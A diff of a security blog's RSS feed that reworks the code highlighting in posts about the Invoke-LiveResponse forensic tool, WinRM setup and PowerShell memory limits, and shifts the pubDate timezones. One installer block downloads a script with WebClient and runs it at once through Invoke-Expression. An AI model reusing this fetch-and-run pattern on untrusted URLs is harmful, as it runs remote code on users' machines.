+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WebClient&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;New-Object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;System.Net.WebClient&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WebClient&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Proxy&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;System.Net.&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;WebRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetSystemWebProxy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WebClient&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Proxy&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Credentials&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;System.Net.&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;CredentialCache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DefaultNetworkCredentials&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Invoke-Expression&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WebClient&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;DownloadString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 
-&lt;span class=&quot;c1&quot;&gt;# Once installed run to load&lt;/span&gt;
-Import-Module Invoke-LiveResponse
+&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# Once installed run to load&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Import-Module&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Invoke-LiveResponse&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 
-&lt;span class=&quot;c1&quot;&gt;# View help&lt;/span&gt;
-Get-Help Invoke-LiveResponse -detailed&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# View help&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Get-Help&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Invoke-LiveResponse&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-detailed&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;h3 id=&quot;winrm&quot;&gt;WinRM&lt;/h3&gt;
 &lt;p&gt;I recommend setting WinRM up via Group policy for simplified deployment across all Powershell versions. Please see the resource section for some good resources and a detailed walkthrough, including a previous post of mine in setting up a lab.&lt;/p&gt;
@@ -814,13 +960,13 @@ Get-Help Invoke-LiveResponse -detailed&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 &lt;h3 id=&quot;memory&quot;&gt;Memory&lt;/h3&gt;
 &lt;p&gt;Powershell has a configuration option to restrict the amount of memory available in a shell. This value is called MaxMemoryPerShellMB, and depending on Powershell version may be set in both Shell and Plugin WSMan configurations. In Powershell 2.0, the default is 150MB, which will likely need to be increased or turned off. As later versions of Powershell have been released, the default values have risen appropriately for most WinRM use, for example in 3.0 MaxMemoryPerShellMB = 1024, which is multiples above required memory.&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# To view this setting locally&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;Get-Item &lt;/span&gt;WSMan:\localhost\Shell\MaxMemoryPerShellMB
-&lt;span class=&quot;nb&quot;&gt;Get-Item &lt;/span&gt;WSMan:\localhost\Plugin\Microsoft.PowerShell\Quotas\MaxMemoryPerShellMB
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;c&quot;&gt;# To view this setting locally&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Get-Item&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WSMan:\localhost\Shell\MaxMemoryPerShellMB&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Get-Item&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WSMan:\localhost\Plugin\Microsoft.PowerShell\Quotas\MaxMemoryPerShellMB&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 
-&lt;span class=&quot;c1&quot;&gt;# To edit this setting locally&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;Set-Item &lt;/span&gt;WSMan:\localhost\Shell\MaxMemoryPerShellMB -Value 1024 -Force
-&lt;span class=&quot;nb&quot;&gt;Set-Item &lt;/span&gt;WSMan:\localhost\Plugin\Microsoft.PowerShell\Quotas\MaxMemoryPerShellMB -Value 1024 -Force&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# To edit this setting locally&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Set-Item&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WSMan:\localhost\Shell\MaxMemoryPerShellMB&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Value&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Force&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Set-Item&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WSMan:\localhost\Plugin\Microsoft.PowerShell\Quotas\MaxMemoryPerShellMB&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Value&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Force&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;p&gt;The simplest approach is to deploy WinRM via Group policy and configure these settings via GPO or logon script. For manual intervention, Invoke-MaxMemory will connect via WinRM and turn off this setting (set to 0). Powershell 2.0 has restrictions in remotely changing WinRM settings, although not ideal from a forensic standpoint, the “–Legacy” switch uses scheduled tasks to force a local configuration change.&lt;/p&gt;
 
@@ -838,8 +984,8 @@ Get-Help Invoke-LiveResponse -detailed&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
   &lt;li&gt;Depending on the selected switches, each selected capability is joined at run time to build the scriptblock pushed out to the target machine.&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;nb&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Invoke-LiveResponse -ComputerName WinRMtester -Credential &amp;lt;Domain&amp;gt;\&amp;lt;user&amp;gt; 
--all -Map &amp;lt;Drive&amp;gt;: -UNC &lt;span class=&quot;s2&quot;&gt;&quot;\\&amp;lt;Server&amp;gt;\&amp;lt;folder&amp;gt; /user:&amp;lt;optional share credentials&amp;gt;&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;nf&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Invoke-LiveResponse&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ComputerName&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WinRMtester&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Credential&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Domain&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
+&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-all&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Map&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Drive&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-UNC&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;\\&amp;lt;Server&amp;gt;\&amp;lt;folder&amp;gt; /user:&amp;lt;optional share credentials&amp;gt;&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;p&gt;&lt;br /&gt;
 Some of the available configuration options:&lt;/p&gt;
@@ -855,8 +1001,8 @@ Some of the switches available in ForensicCopy mode:&lt;/p&gt;
   &lt;li&gt;The benefit of this method is the ability to operationalise new capability easily by dropping in new content with desired StdOut.&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# Command to run Powersell mode&lt;/span&gt;
-Invoke-LiveResponse -ComputerName WinRMtester -Credential &amp;lt;domain&amp;gt;\&amp;lt;user&amp;gt; -LR  -Results &amp;lt;results&amp;gt; e.g C:\Cases&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;c&quot;&gt;# Command to run Powersell mode&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Invoke-LiveResponse&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ComputerName&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WinRMtester&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Credential&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;domain&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-LR&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Results&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;results&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e.g&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\Cases&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2018-01-14-Invoke-LiveResponse/09LiveResponse.png&quot; width=&quot;600&quot; /&gt;&lt;/div&gt;
 
@@ -944,7 +1090,7 @@ Invoke-LiveResponse -ComputerName WinRMtester -Credential &amp;lt;domain&amp;gt;
 &lt;/ol&gt;
 
 </description>
-        <pubDate>Sun, 14 Jan 2018 00:00:00 +1100</pubDate>
+        <pubDate>Sun, 14 Jan 2018 00:00:00 +0000</pubDate>
         <link>https://mgreen27.github.io/posts/2018/01/14/Invoke-LiveResponse.html</link>
         <guid isPermaLink="true">https://mgreen27.github.io/posts/2018/01/14/Invoke-LiveResponse.html</guid>
         
@@ -1069,7 +1215,7 @@ In my use case I used a a WQL query that polls every 30 seconds to report on all
   &lt;/li&gt;
 &lt;/ol&gt;
 </description>
-        <pubDate>Mon, 03 Apr 2017 00:00:00 +1000</pubDate>
+        <pubDate>Mon, 03 Apr 2017 00:00:00 +0000</pubDate>
         <link>https://mgreen27.github.io/posts/2017/04/03/Blue_Team_Hacks-WMI_Eventing.html</link>
         <guid isPermaLink="true">https://mgreen27.github.io/posts/2017/04/03/Blue_Team_Hacks-WMI_Eventing.html</guid>
         
@@ -1152,12 +1298,12 @@ In my use case I used a a WQL query that polls every 30 seconds to report on all
 
 &lt;p&gt;Alternatively, for those looking for a PowerShell command line version: Running the command below to setup WinRM locally on your test hosts is fairly painless. Options like Enterprise Deployment Tool, Logon Script, PSEXEC or WMIC can be used for deployment as required. It is also worth noting that to configure a custom listener port you are required to use a CLI based configuration.&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# Setup: &lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Enable-PSRemoting -Force
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;c&quot;&gt;# Setup: &lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Enable-PSRemoting&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Force&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 
-&lt;span class=&quot;c1&quot;&gt;# Confirm WinRM is setup and responsive:&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Test-WSMan&lt;/span&gt; &amp;lt;ComputerName&amp;gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Options]
-&lt;span class=&quot;nb&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Test-WSMan&lt;/span&gt; &amp;lt;ComputerName&amp;gt; -Credential &amp;lt;Domain\User&amp;gt; -Authentication Kerberos &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# Confirm WinRM is setup and responsive:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Test-WSMan&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ComputerName&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;Options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Test-WSMan&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ComputerName&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Credential&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Domain\User&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Authentication&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Kerberos&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2017-01-12-PowerShell_Remoting_IR/04testnoauth.png&quot; width=&quot;600&quot; /&gt;&lt;/div&gt;
 
@@ -1238,7 +1384,7 @@ In my use case I used a a WQL query that polls every 30 seconds to report on all
 &lt;/ol&gt;
 
 </description>
-        <pubDate>Thu, 12 Jan 2017 00:00:00 +1100</pubDate>
+        <pubDate>Thu, 12 Jan 2017 00:00:00 +0000</pubDate>
         <link>https://mgreen27.github.io/posts/2017/01/12/PowerShell_Remoting_IR.html</link>
         <guid isPermaLink="true">https://mgreen27.github.io/posts/2017/01/12/PowerShell_Remoting_IR.html</guid>
         
